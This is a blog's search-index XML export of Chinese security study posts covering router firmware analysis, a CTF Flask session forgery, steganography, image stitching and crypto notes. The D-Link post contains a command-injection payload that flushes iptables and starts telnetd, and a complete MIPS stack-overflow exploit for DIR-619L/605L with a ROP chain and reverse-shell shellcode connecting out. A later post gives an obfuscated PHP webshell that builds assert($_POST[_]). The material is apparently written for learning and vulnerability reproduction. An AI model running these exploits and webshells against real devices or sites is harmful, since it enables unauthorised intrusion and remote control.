<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[DIR-816再分析]]></title>
    <url>%2F2019%2F10%2F19%2FDIR-816%E5%86%8D%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[群晖的路由器好难分析，最后还是只能复现一下D-LINK的相关漏洞。 DIR-816历史漏洞 CVE-2018-17066: Command injection. Credit: nabla CVE-2018-17068: Command injection. Credit: nabla CVE-2018-17064: Command injection. Credit: nabla CVE-2018-17063: Command injection. Credit: nabla CVE-2018-17067: Stack overflow. Credit: nabla CVE-2018-17065: Stack overflow. Credit: nabla CVE-2019-10041: Edit System Account Without Authentication. Credit: lbp CVE-2019-10039: Edit Web And System Account Without Authentication. Credit: lbp CVE-2019-10040: Remote Command Execute. Credit: lbp CVE-2019-10042: Reset Router Without Authentication. Credit: lbp DIR-816管理页面分析 主程序位于 ./bin/goahead 输入账号密码后，将会向goform/formLogin接口发送如下图所示的数据包进行验证。从数据包中可以看到关键的参数有username，password以及tokenid，其中username使用了base64进行编码，password则进行了某种加密 ghidra中查看函数 FUN_00457a74的源码 123456789101112131415161718192021222324252627282930313233343536........username = websGetVar(iParm1,"username",&amp;DAT_00473984); password = (char *)websGetVar(iParm1,"password",&amp;DAT_00473984); tokenid = (char *)websGetVar(iParm1,"tokenid",&amp;DAT_00473984); strcpy((char *)&amp;local_158,tokenid); /* tokenid 进行拼接 */ strcat((char *)&amp;local_158,"B05CC245BFB8A28A83B4F80000000000"); websDecode64(acStack296,username,0x80); if (*password != 0) &#123; decrypt_aes(&amp;local_158,password,acStack168); &#125; compareResult = strcmp(__s1,acStack296); if (compareResult == 0) &#123; iVar2 = strcmp(__s1_00,acStack168); if (iVar2 == 0) &#123; logout = 0; /* 如果密码正确记录login为1 */ login = 1; strncpy(load_host,(char *)(iParm1 + 0x30),0x20); if (g_LanWanConflict == 1) &#123; websRedirect(iParm1,"d_wan_collision.asp"); g_LanWanConflict = 0; &#125; else &#123; websRedirect(iParm1,"index.asp"); &#125; /* 同时向这个文件写入0 */ system("echo \"0\" &gt; /etc/RAMConfig/confirmlogin"); load_dictionary(uVar1,dictionary); return; &#125; &#125; system("echo \"1\" &gt; /etc/RAMConfig/confirmlogin"); //登陆失败就写入1 websRedirect(iParm1,"dir_login.asp"); return; 在更新BSS区的变量load_host后则会检测lan口和wan口的状态并返回对应的登录页面，随后将0写入/etc/RAMConfig/confirmlogin文件中 通过上述的分析，实际上D-Link路由器在认证成功后仅仅记录了成功登录的用户IP地址，随后将是否需要验证登录的Flag文件内容设置为了0。 如下图所示， 在更新BSS区的变量load_host后则会检测lan口和wan口的状态并返回对应的登录页面，随后将0写入/etc/RAMConfig/confirmlogin文件中。 相关的handler 对于cgi程序是如何处理路由还不是很熟悉，不过感觉handler就是一个类似处理路由的函数 根据不同的url路径goahead进程将使用不同的Handler进行处理。看到有两个全局Handler,websSecurityHandler和websDefaultHandler。 websDefaultHandler会调用websValidateUrl函数对请求的url地址进行检测，主要的功能是对转义符号进行处理并避免'**../'**路径穿越的问题。 相关代码如下： 12345678910111213141516171819 while (__s_01 != (char *)0x0) &#123; *__s_01 = '/'; __s_01 = strchr(__s_01,0x5c); &#125; __s_01 = strtok(__s_00,"/"); if (__s_01 != (char *)0x0) &#123; do &#123; while( true ) &#123; if (0x3f &lt; iVar4) goto LAB_004088bc; iVar2 = strcmp(__s_01,".."); //查找到相关的字符，防止目录穿越 if (iVar2 != 0) break; if (0 &lt; iVar4) &#123; iVar4 = iVar4 + -1; &#125;LAB_004086e8: __s_01 = strtok((char *)0x0,"/"); if (__s_01 == (char *)0x0) goto LAB_00408788; &#125; iVar2 = strcmp(__s_01,"."); form越权漏洞利用 通过对main函数分析，可以找到相关的form函数 重点关注sub_458D7C这个函数 可以执行任意命令了 写的比较仓促，路由器的模拟也没有成功，还是需要用qemu单独调试]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>IOT</tag>
        <tag>cgi</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[10月12日线下赛总结]]></title>
    <url>%2F2019%2F10%2F14%2F10%E6%9C%8812%E6%97%A5%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[虽然很菜但是也忍不住想要总结一下 我们7点四十左右到底，八点半开始比赛，总共就两个小时，前半个小时用来加固自己的服务器。服务器3台，python一个，java一个，pwn一个。比赛开始的时候第一反应不都是登陆ssh嘛，结果一直连不上，然后工作人员告诉我们需要在网页登陆。。神tm网页登陆，那我怎么拷贝源码。。本来想用scp命令的结果发现这靶机连自己的机器都ping不通。。没办法只能通过网页的shell查看源码，折腾了好久才修改了密码，这时候半个小时早就过去了。于是开始了混战模式，这个时候ssh可以连上去了，但是pwn师傅的ssh一直连不上。那连不上还咋分析程序啊23333，没办法web狗开始审计源代码，python的站挺简单的，发现了一个SSTI漏洞，只过滤了几个关键字，把准备好的payload搞上去，试了好半天却没有得到flag？？？后来经过不懈的努力终于成功地读到了flag，然后就去交。。神tm还要验证码和对应靶机的ip地址。填完之后却提示flag错误了？？？难道这是别的队伍故意设下的陷进给的假的flag不成？？但是我又试了好多个还是失败了。。这就不知道为什么了。。 总之后期就是一直在交flag，，java的站连网站根目录都没有发现(原谅我tcl)，pwn师傅的ssh好不容易连上了却发现无法连上别的队伍的pwn服务器？？那还搞锤子。。结果后来pwn师傅也开始帮我交flag了，最后总算是靠着这个漏洞狗住了，从12名跳到了第四名。。 唉赛后pwn师傅一直吐槽这个服务器垃圾，赛后才知道原来是python的服务器的flag生成有问题导致。。唉不说了回家好好练习。。]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>杂的文</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[二值图像的隐写]]></title>
    <url>%2F2019%2F10%2F14%2F%E4%BA%8C%E5%80%BC%E5%9B%BE%E5%83%8F%E7%9A%84%E9%9A%90%E5%86%99%2F</url>
    <content type="text"><![CDATA[算法思想 把一个二值图像分成矩形图像区域Bi,若某块p1bi &gt; 50% 则嵌入一个1，若p0bi &gt; 50% 则嵌入一个0 但是在嵌入的过程中需要对一些像素的颜色进行调整。 准备1——计算可以利用的块 由上图可以看出，只有当一个块中0或者1的比例落在某个区间并且结合消息是0or1才可以决定这一块究竟是藏0还是藏1 为了简化我们将一幅图片分为10*10的大小，同时我们采用8*8检测，于是可以严格8*8检测的就只剩下中间的64个块了 我们假设有： msg 要隐藏的消息 count 消息的长度 image 二值图像 R1,R0,lumda 是我们设置的参数 computep1bi函数可以计算出某个块的p1bi row,col是为了随机隐藏我们随机选择的块首地址 我们需要确定的就是随机选出来的row和col是否可以用，于是很自然地想到需要对8*8的块进行遍历，同时标记col和row是否可用，不可用的直接将其设为-1 1234567% 最后计算哪些是可以用的存起来j = 1;for i = 1:m*nif row(i) ~= -1 availabler(j) = row(i); availablec(j) = col(i); j = j+1; 完整代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677%分析可用的图像块与秘密信息对应% msg count 为密码消息及其数量% row col 存放的是随机选块后的块首地址的行列地址% m*n 为总体数量% image 为载体图像% R1,R0,lumda 为参数% randr randc 是在8*8范围内随机置乱的行列标function [availabler, availablec, image] = available(msg, count, row, col, m, n, image, R1, R0, lumda, randr, randc) msgquan = 1; unable = 0; difficult = 0; for blockquan = 1:m*n % 计算这一块的p1bi p1bi = compute1bi(row(blockquan), col(blockquan), image); %计算p1(bi) if p1bi &gt;= R1+3*lumda || p1bi &lt;= R0 -3*lumda row(blockquan) = -1; % 标记为无用 col(blockquan) = -1; unable = unable + 1; msgquan = msgquan - 1; % 该消息还未找到可以隐藏的块 elseif msg(msgquan, 1) == 1 &amp;&amp; p1bi &lt;= R0 % 调整p1bi变的更小 image = editp1bi(row(blockquan), col(blockquan), image, 1, 3*lumda, randr, randc); row(blockquan) = -1; col(blockquan) = -1; difficult = difficult + 1; msgquan = msgquan - 1; elseif msg(msgquan, 1) == 0 &amp;&amp; p1bi &gt;= R1 image = editp1bi(row(blockquan),col(blockquan),image,0,3*lumda,randr,randc); row(blockquan) = -1; col(blockquan) = -1; difficult = difficult + 1; msgquan = msgquan - 1; else row(blockquan) = row(blockquan); col(blockquan) = col(blockquan); end msgquan = msgquan + 1; if msgquan == count + 1;%该消息已经读取完成 for i = (blockquan + 1):m*n %将其余的都设置为不可用 row(i) = -1; col(i) = -1; end disp(['消息长度:', num2str(msgquan - 1), 'bits;用到的块数:', num2str(blockquan),';其中不可用的块有:', num2str(unable),';另有',num2str(difficult),'块难以调整已修改为不可用块']) break; end end %载体分析完但消息还没有读完 if msgquan &lt;= count disp(['消息长度:', num2str(msgquan - 1), 'bits;用到的块数:', num2str(blockquan),';其中不可用的块有:', num2str(unable),';另有',num2str(difficult),'块难以调整已修改为不可用块']) disp('请根据以上数据更换载体'); error('载体太小'); end %计算可用块的数量 %disp(row) quan = 0; for i = 1:m*n if row(i) ~= -1 quan = quan + 1; end end if quan &lt; count error('可用快太小'); end disp(['可用图像块为：', num2str(quan)]); %生成可用块的行标列标并于消息对应 image = round(image); availabler = zeros([1, quan]); availablec = zeros([1, quan]); j = 1; for i = 1:m*n if row(i) ~= -1 availabler(j) = row(i); availablec(j) = col(i); j = j+1; end end 准备2——修改像素点 1234567891011121314151617181920212223242526272829303132%修改像素的函数% headr为块首行地址% headc为块首列地址% image 为图像% pixel 为要修改的像素% count 为修改的数量% randr randc 是随机置乱的结果function image = editp1bi(headr, headc, image, pixel, count, randr, randc) c = 0; for i = 1:64 if image(headr+randr(i), headc+randc(i)) == pixel %八连接检测 if image(headr+randr(i)-1, headc+randc(i)) == ~pixel ||... image(headr+randr(i)+1,headc+randc(i)) == ~pixel ||... image(headr+randr(i),headc+randc(i) - 1) ~= pixel || ... image(headr+randr(i),headc+randc(i) + 1) ~= pixel || ... image(headr+randr(i)-1,headc+randc(i) - 1) ~= pixel|| ... image(headr+randr(i) -1,headc+randc(i) + 1) ~=pixel||... image(headr+randr(i)+ 1,headc+randc(i) - 1) == ~pixel ||... image(headr+randr(i) + 1,headc+randc(i) + 1) == ~pixel... image(headr+randr(i), headc+randc(i)) = ~pixel+0.01; c = c+1; end end if c==count return end end if c ~= count disp('warning! 参数选择不当 未能。。。建议重做'); end 这里其实就是针对中间的64个块进行8连接检测。关于8连接检测边界的做法，我的理解就是只要一个像素点周围的8个点有一个不一样就说明这个点是可以修改的，并且为了防止边界扩散，我们并不直接取反，而是取反后+0.01 准备3——计算p1bi的函数 123456789function p1bi = compute1bi(headr,headc,image) p1bi = 0; for i = 1:10 for j = 1:10 if image(headr+i-1, headc+j-1) == 1 p1bi = p1bi + 1; end end end]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>matlab</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[图片拼接作业]]></title>
    <url>%2F2019%2F10%2F14%2F%E5%9B%BE%E7%89%87%E6%8B%BC%E6%8E%A5%E4%BD%9C%E4%B8%9A%2F</url>
    <content type="text"><![CDATA[sift算子 角点检测技术，比如Harris等，具有旋转不变性，即使图片发生了旋转，我们也能找到同样的角点。但是对图片进行缩放之后，角点就可能不再是角点了。 所以我们需要用尺度去描绘一副图片，不同大小的图片描绘的尺度，可以理解成单位是不一样的。为了达到这个目的需要使用尺度空间滤波器。SIFT算法使用高斯差分算子DOG来对LoG做一次近似。 图像金字塔，分成很多层，每一层又有很多组。之后我们可以做差值，经过一系列繁琐的步骤找到极值点。 按照教程写了一个代码调试一下： 123456789img = cv2.imread('src1.jpg')# 变成灰度图像gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)sift = cv2.xfeatures2d.SIFT_create()kp = sift.detect(gray, None)img = cv2.drawKeypoints(gray,kp,outImage=gray)cv2.imshow('img',img)cv2.waitKey() 效果图如下： 注意我使用的opencv版本，要使用sift算子必须是sift = cv2.xfeatures2d.SIFT_create() 之后检测到特征点，直接调用cv2.drawKeypoints函数描绘特征点 cv2.drawKeypoints主要的五个参数 image:也就是原始图片 keypoints：从原图中获得的关键点，这也是画图时所用到的数据 outputimage：输出 //可以是原始图片 color：颜色设置，通过修改（b,g,r）的值,更改画笔的颜色，b=蓝色，g=绿色，r=红色。 flags：绘图功能的标识设置 特征点匹配如何做到图片拼接 这个问题我也很疑惑之后再写 图片拼接作业代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#coding: utf-8import numpy as npimport cv2 ''' 参考链接 https://blog.csdn.net/qq878594585/article/details/81901703'''leftgray = cv2.imread('src2.jpg')rightgray = cv2.imread('src1.jpg') hessian=400surf = cv2.xfeatures2d.SURF_create(hessian)#surf=cv2.SURF(hessian) #将Hessian Threshold设置为400,阈值越大能检测的特征就越少kp1,des1=surf.detectAndCompute(leftgray,None) #查找关键点和描述符kp2,des2=surf.detectAndCompute(rightgray,None) FLANN_INDEX_KDTREE=0 #建立FLANN匹配器的参数indexParams=dict(algorithm=FLANN_INDEX_KDTREE,trees=5) #配置索引，密度树的数量为5searchParams=dict(checks=50) #指定递归次数#FlannBasedMatcher：是目前最快的特征匹配算法（最近邻搜索）flann=cv2.FlannBasedMatcher(indexParams,searchParams) #建立匹配器matches=flann.knnMatch(des1,des2,k=2) #得出匹配的关键点 good=[]#提取优秀的特征点for m,n in matches: if m.distance &lt; 0.7*n.distance: #如果第一个邻近距离比第二个邻近距离的0.7倍小，则保留 good.append(m)src_pts = np.array([ kp1[m.queryIdx].pt for m in good]) #查询图像的特征描述子索引dst_pts = np.array([ kp2[m.trainIdx].pt for m in good]) #训练(模板)图像的特征描述子索引H=cv2.findHomography(src_pts,dst_pts) #生成变换矩阵h,w=leftgray.shape[:2]h1,w1=rightgray.shape[:2]shft=np.array([[1.0,0,w],[0,1.0,0],[0,0,1.0]])M=np.dot(shft,H[0]) #获取左边图像到右边图像的投影映射关系dst_corners=cv2.warpPerspective(leftgray,M,(w*2,h))#透视变换，新图像可容纳完整的两幅图cv2.imshow('tiledImg1',dst_corners) #显示，第一幅图已在标准位置dst_corners[0:h,w:w*2]=rightgray #将第二幅图放在右侧cv2.imwrite('tiled.jpg',dst_corners)cv2.imshow('tiledImg',dst_corners)cv2.imshow('leftgray',leftgray)cv2.imshow('rightgray',rightgray)cv2.waitKey()cv2.destroyAllWindows() 原来博主的代码出了一点小问题，估计是复制粘贴的时候出的错。修改了一下可以运行，效果如下： 参考 特征匹配]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>opencv</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python审计之flask]]></title>
    <url>%2F2019%2F10%2F10%2Fpython%E5%AE%A1%E8%AE%A1%E4%B9%8Bflask%2F</url>
    <content type="text"><![CDATA[菜鸡决定对python审计好好复习一下 HCTF2018 admin 复现 虽然是非预期解但是也很有趣，师傅写的代码也挺棒的 在修改密码的页面查看源代码发现了一个提示。(不过这个挺难发现的还是要养成多看看源码的习惯) 123456789101112&lt;div class="ui grid"&gt; &lt;div class="four wide column"&gt;&lt;/div&gt; &lt;div class="eight wide column"&gt; &lt;!-- https://github.com/woadsl1234/hctf_flask/ --&gt; &lt;form class="ui form segment" method="post" enctype="multipart/form-data"&gt; &lt;div class="field required"&gt; &lt;label&gt;NewPassword&lt;/label&gt; &lt;input id="newpassword" name="newpassword" required type="password" value=""&gt; &lt;/div&gt; &lt;input type="submit" class="ui button fluid" value="更换密码"&gt; &lt;/form&gt; 之后就可以看到flask的secret_key是ckj123 同时可以看到flag获得的条件 123&#123;% if current_user.is_authenticated and session['name'] == 'admin' %&#125;&lt;h1 class="nav"&gt;hctf&#123;un1c0dE_cHe4t_1s_FuNnying&#125;&lt;/h1&gt;&#123;% endif %&#125; 然后就可以伪造session了，抓包后修改session就可以了(Windows的python3跑不了用的WSL中的python3) 12flask-session-cookie-manager git:(master) python3 session_cookie_manager.py encode -s &apos;ckj123&apos; -t &apos;&#123;&quot;name&quot;:&quot;admin&quot;, &quot;user_id&quot;:&quot;1&quot;&#125;&apos;eyJuYW1lIjoiYWRtaW4iLCJ1c2VyX2lkIjoiMSJ9.XZ9J5Q.mDSLo4JaAJRZVahOGaLqKCuswD8 分析一下源码 app目录主要内容，其中code.py是用来产生验证码的，config.py是配置文件，forms.py是表单建模，models.py是一些模型，routers.py是路由 123456789101112131415├── app│ ├── __init__.py│ ├── __init__.pyc│ ├── code.py│ ├── code.pyc│ ├── config.py│ ├── config.pyc│ ├── forms.py│ ├── forms.pyc│ ├── models.py│ ├── models.pyc│ ├── routes.py│ ├── routes.pyc│ ├── static│ └── templates 我们拿到flag的条件就是登陆admin用户，登陆的路由如下： 1234567891011121314151617@app.route('/login', methods = ['GET', 'POST'])def login(): # TODO: 此处current_user是什么意思？它是从flask_login中导入的 if current_user.is_authenticated: return redirect(url_for('index')) form = LoginForm() if request.method == 'POST': name = strlower(form.username.data) #从表单中获取到name然后存入session中 session['name'] = name user = User.query.filter_by(username=name).first() if user is None or not user.check_password(form.password.data): flash('Invalid username or password') return redirect(url_for('login')) login_user(user, remember=form.remember_me.data) return redirect(url_for('index')) return render_template('login.html', title = 'login', form = form) 这里涉及到了flask的用户认证可以学习一下，令人疑惑的是文档中说了这个is_authenticated方法需要自己实现，但是我并没有在源代码中找到实现了这个方法。 参考文档]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>flask</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[密码学复习]]></title>
    <url>%2F2019%2F10%2F10%2F%E5%AF%86%E7%A0%81%E5%AD%A6%E5%A4%8D%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[先补习一下数学知识 随机变量 这张ppt中，定义$X(y) = lsb, (y) $ 于是可以得出随机变量的概率分布 联合随机分布 联合随机分布就是指对于$U$中所有的变量，概率都是相等的 随机算法 这个适合确定性算法相对应的(或许和后面的nounce有关？) r是从{0, 1}^n中的联合随机分布，作为参数输入到函数A中，这样得到的结果y也是随机的 secure PRF 挑战者随机选择，攻击者发送一连串的x进行试验，某两次实验的结果相同的概率是可忽略的，则这个PRF就是安全的 区分PRP和PRF 如下同样的两个算法，对于PRP来说是安全的，但是对于PRF却是不安全的 但是不太理解其中的分析，为什么第一次EXP(O) = 1的概率就是0呢？]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>密码学</tag>
        <tag>数学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[路由器相关RCE漏洞分析]]></title>
    <url>%2F2019%2F10%2F05%2F%E8%B7%AF%E7%94%B1%E5%99%A8%E7%9B%B8%E5%85%B3RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[复习一下基本知识 postgresql数据库操作 如果是安装好了postgresql数据库就会新建一个postgreql用户 sudo su - postgres切换到postgresql psql就可以直接登陆 基本操作如下： \l列出所有的数据库 \c选择数据库 \dt列出所有表 \d描述表的信息 使用firmadyne会将信息保存到postgresql数据库中 ubuntu安装burp 下载地址 然后java -jar .jar就可以启动了 D-Link850L RCE分析 参考文章 信息泄露 位于fatlady.php文件中，很明显的看到了参数拼接的行为 构造恶意数据发送 1&lt;?xml version="1.0" encoding="utf-8" ?&gt;&lt;postxml&gt;&lt;module&gt;&lt;service&gt;../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml&lt;/service&gt;&lt;/module&gt;&lt;/postxml&gt; 可以看到其解析了但是并没有返回数据 尝试多次均失败，于是用默认密码直接登录上去 漏洞点： 1234567891011121314151617181920212223$server = query("/device/time/ntp/server");$period = query("/device/time/ntp/period"); if ($period=="") $period="604800";$period6 = query("/device/time/ntp6/period"); if ($period6=="") $period6="604800";$ntp_run = "/var/run/ntp_run.sh";if ($enable==1 &amp;&amp; $enablev6==1)&#123; if ($server=="") fwrite(a, $START, 'echo "No NTP server, disable NTP client ..." &gt; /dev/console\n'); else &#123; fwrite(w, $ntp_run, '#!/bin/sh\n'); fwrite(a, $ntp_run, 'echo "Run NTP client ..." &gt; /dev/console\n'. 'echo [$1] [$2] &gt; /dev/console\n'. 'STEP=$1\n'. 'RESULT="Null"\n'. 'xmldbc -s /runtime/device/ntp/state RUNNING\n'. 'SERVER4='.$server.'\n'. 'SERVER6=`xmldbc -g /runtime/device/ntp6/server | cut -f 1 -d " "`\n'. 'if [ "$STEP" == "V4" ]; then\n'. ' xmldbc -t "ntp:'.$period.':'.$ntp_run.' $STEP"\n'. ' echo "ntpclient -h $SERVER4 -i 5 -s -4" &gt; /dev/console\n'. ' ntpclient -h $SERVER4 -i 5 -s -4 &gt; /dev/console\n'. 这里直接把$server变量拼接在了命令执行的代码中，存在命令注入 首先，获取DEVICE.TIME服务的xml文件格式 &lt;center&gt;但是格式好像有问题&lt;/center&gt; 使用如下payload尝试 12345678910111213141516171819202122232425&lt;?xml version="1.0" encoding="utf-8" ?&gt;&lt;postxml&gt; &lt;module&gt; &lt;service&gt;DEVICE.TIME&lt;/service&gt; &lt;device&gt; &lt;time&gt; &lt;ntp&gt; &lt;enable&gt;1&lt;/enable&gt; &lt;period&gt;604800&lt;/period&gt; &lt;server&gt;metelesku;(iptables -F ;iptables -X;iptables -t nat -F;iptables -t nat -X;iptables -t mangle -F;iptables -t mangle -X;iptables -P INPUT ACCEPT; iptables -P FORWARD ACCEPT;iptables -P OUTPUT ACCEPT;telnetd -p 23090 -l /bin/date) &amp;amp; exit;&lt;/server&gt; &lt;/ntp&gt; &lt;ntp6&gt; &lt;enable&gt;1&lt;/enable&gt; &lt;period&gt;604800&lt;/period&gt; &lt;/ntp6&gt; &lt;timezone&gt;63&lt;/timezone&gt; &lt;time/&gt; &lt;date/&gt; &lt;dst&gt;0&lt;/dst&gt; &lt;dstmanual/&gt; &lt;dstoffset/&gt; &lt;/time&gt; &lt;/device&gt; &lt;/module&gt;&lt;/postxml&gt; 但是还是失败了 DIR-619L&amp;605L 栈溢出漏洞 漏洞点在/bin/boa程序处 通过ghidra反编译代码可以看到： formLanguageChange函数 12345678910111213 if (pcVar2 != (char *)0x0) &#123; strncpy(local_f8,__s1,(size_t)(pcVar2 + -(int)__s1)); local_f8[(int)(pcVar2 + -(int)__s1)] = 0; goto LAB_00460b34; &#125; uVar3 = websGetVar(uParm1,"currTime",&amp;DAT_004ac874); &#125; //formLanguageChange接下来调用了sprintf危险函数向local_f8变量中读入参数内容 sprintf(local_f8,"%s?t=%s",__s1,uVar3);LAB_00460b34: websRedirect(uParm1,local_f8); //websRedirect使用了local_f8作为参数。 system("echo 4 &gt; /proc/gpio"); iVar1 = apmib_update(4); websGetVar函数获取到参数之火传入uVar3变量，之后sprintf函数将其写入到local_f8中，再调用websRedirect函数进行URL跳转 websGetVar函数 12345678910 &#125; //websGetVar通过malloc、memcpy将获取到的参数返回给formLanguageChange。 if (-1 &lt; (int)__n) &#123; pvParm3 = malloc(__n + 1); memcpy(pvParm3,query_temp_var,__n); *(undefined *)((int)pvParm3 + __n) = 0; addTempStr(pvParm3); &#125; return pvParm3;&#125; 继续分析websRedirect函数 12345678910111213undefined4 websRedirect(int iParm1,char *pcParm2)&#123; char *pcVar1; *(undefined4 *)(iParm1 + 0x50) = 0; pcVar1 = strstr(pcParm2,"/apply_setting.asp"); if (pcVar1 != (char *)0x0) &#123; apply_setting_redirect = apply_setting_redirect + 1; &#125; send_r_moved_perm(iParm1,pcParm2); return 0;&#125; 可以看到调用了send_r_moved_perm函数 123456789101112131415req_write(iParm1,uVar1);req_write(iParm1,&amp;DAT_004a1f14);pcVar2 = strstr(pcParm2,"http://");if (pcVar2 == (char *)0x0) &#123; if (*pcParm2 == '/') &#123; pcParm2 = pcParm2 + 1; &#125; sprintf(acStack224,"http://%s/%s",*(undefined4 *)(iParm1 + 0x70),pcParm2); pcParm2 = acStack224;&#125;sprintf(acStack480, "&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;\r\n\t\tThis document has moved to a new &lt;ahref=\"%s\"&gt;location&lt;/a&gt;.\r\n\t\tPlease update your documents to reflect the newlocation.\r\n\t\t&lt;/body&gt;&lt;/html&gt;\r\n" ,pcParm2);req_write(iParm1,acStack480); 在send_r_moved_perm函数中两次调用了sprintf函数分别向acStack224(sp+0x19f8-0xe0)和acStack480(sp+0x19f8-0x1e0)中输入字符。 通过第二两个sprintf修改返回地址，构造ROP链，导致程序控制流被劫持。（也可以通过两个sprintf的配合来实现栈的迁移，漏洞作者是这么实现的） 在mips虚拟机中尝试运行程序但是失败了,firmadyne模拟固件也没成功 记录一下其实是文件损坏了所以qemu模拟不了 1ecutable, MIPS, MIPS-I version 1 (SYSV), dynamically linked (uses shared libs), corrupted section header size 在我的WSL中使用最新的qemu是可以模拟的 123➜ squashfs-root-0 sudo chroot . ./qemu ./bin/boa Initialize AP MIB failed!qemu: uncaught target signal 11 (Segmentation fault) - core dumped[1] 363 segmentation fault (core dumped) sudo chroot . ./qemu ./bin/boa 那看来需要更新一下qemu版本了 记录一下exp 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576import requestsimport sysimport structfrom pwn import *#context.log_level='debug'context.arch='mips'context.endian='big'ip='192.168.75.150'def syscmd1(a): p=remote(ip,80) z=len(a) print "[+]len:"+str(z) payload='' payload+='POST /goform/formLanguageChange HTTP/1.1\r\n' payload+='Host: '+ip+'\r\n' payload+='Connection: keep-alive\r\n' payload+='Accept-Encoding: gzip, deflate\r\n' payload+='Accept: */*\r\n' payload+='User-Agent: python-requests/2.18.4\r\n' payload+='Content-Length: '+str(z+9)+'\r\n' payload+='Content-Type: application/x-www-form-urlencoded\r\n' payload+='\r\n' payload+='currTime=' payload+=a+'\r\n' p.send(payload) p.recvuntil('&lt;/html&gt;') #raw_input() p.close()#base address of libc.so.0base1=0x2ab88000###shellcodesc=struct.pack("&gt;I",0x24060101)sc+=struct.pack("&gt;I",0x04d0ffff)sc+=struct.pack("&gt;I",0x2806ffff)sc+=struct.pack("&gt;I",0x27bdffe0)sc+=struct.pack("&gt;I",0x27e41001)sc+=struct.pack("&gt;I",0x2484f023)sc+=struct.pack("&gt;I",0xafa4ffe8)sc+=struct.pack("&gt;I",0xafa0ffec)sc+=struct.pack("&gt;I",0x27a5ffe8)sc+=struct.pack("&gt;I",0x24020fab)sc+=struct.pack("&gt;I",0xafa00108)sc+=struct.pack("&gt;I",0x0101010c)sc+="/bin//sh\x00"shellcode =''shellcode += asm(shellcraft.connect('192.168.75.149',5555))shellcode += asm(shellcraft.dup2(5,0))shellcode += asm(shellcraft.dup2(5,1))shellcode += scs0=struct.pack("&gt;I",base1+0x2C794)s1=struct.pack("&gt;I",base1+0x2C794)### rop2:move $t9,$s2;...;jr $t9 s2=struct.pack("&gt;I",base1+0x24b70)### rop3:sleep(1)s3=struct.pack("&gt;I",base1+0x2bdac)### rop5:addiu $a0,$sp,0x18;...;lw $ra,0x30;jr $ras4=struct.pack("&gt;I",base1+0x2bdac)###roppayload1='a'*0x167+s0+s1+s2+s3payload1+=struct.pack("&gt;I",base1+0x25714) ###rop1: li $a0,1;move $t9,$s1;jalr $t9;ori $a1,$s0,2payload1+='b'*0x1c+s0+s1+s2+s3+s4payload1+=struct.pack("&gt;I",base1+0x5f98) ###rop4:lw $ra,0x1c($sp);...;jr $rapayload1+='c'*0x1cpayload1+=s3payload1+='d'*0x18payload1+=struct.pack("&gt;I",0x24910101) ###rop7 addiu $s1,$a0,257;addi $s1,$s1,-257;move $t9,$s1;jalr $t9payload1+=struct.pack("&gt;I",0x2231feff)payload1+=struct.pack("&gt;I",0x0220c821)payload1+=struct.pack("&gt;I",0x0320f809)payload1+=struct.pack("&gt;I",0x2231feff)payload1+=struct.pack("&gt;I",0x2231feff)payload1+=struct.pack("&gt;I",base1+0x2bda0) ###rop6:mov $t9,$a0;...;jalr $t9payload1+='e'*0x20+shellcodeif __name__ == "__main__": syscmd1(payload1) 参考 D-Link-Dir-850L-远程命令执行漏洞 路由器漏洞分析系列（2）：CVE-2018-20056 DIR-619L&amp;605L 栈溢出漏洞分析及复现]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>IOT</tag>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php一些webshell构造总结]]></title>
    <url>%2F2019%2F10%2F05%2Fphp%E4%B8%80%E4%BA%9Bwebshell%E6%9E%84%E9%80%A0%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[ASCII表复习 由于构造shell的时候都需要使用到异或等运算，所以手边一定要常备ASCII码表 表格总共是16行8列 从0开始，到0x7f结束 记住常用的ASCII码值 123450 十进制 48 十六进制 0x301 十进制 49 十六进制 0x31A 十进制 65 十六进制 0x41 其实就是跨了16行正好在相邻的列上a 十进制 97 十六进制 0x61 垮了两次16行 最基本的无字母数字webshell 1234&lt;?phpif(!preg_match('/[a-z0-9]/is',$_GET['shell'])) &#123; eval($_GET['shell']);&#125; 参考p牛的文章 通过异或 12345&lt;?php$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); // $_='assert';$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']'); // $__='_POST';$___=$$__;$_($___[_]); // assert($_POST[_]); 取反 核心也是构造出一个函数]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>webshell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[java代码审计基础]]></title>
    <url>%2F2019%2F10%2F04%2Fjava%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%2F</url>
